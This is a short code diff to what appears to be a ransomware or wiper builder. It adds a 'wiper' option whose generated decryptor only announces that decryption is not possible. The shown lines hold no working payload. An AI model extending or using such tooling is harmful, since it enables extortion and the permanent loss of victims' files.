@@ -106,7 +106,8 @@ def decrypt_file(file_name, key):
     elif type == 'pyaes':
         script = script.replace('<type>', pyaes)
         script = script.replace('<import>', 'import pyaes')
-
+    elif type == 'wiper':
+        script = 'Wiper selected. Decryption not possible!'
 
     with open('./decryptor.py', 'w') as f:
         f.write(script)
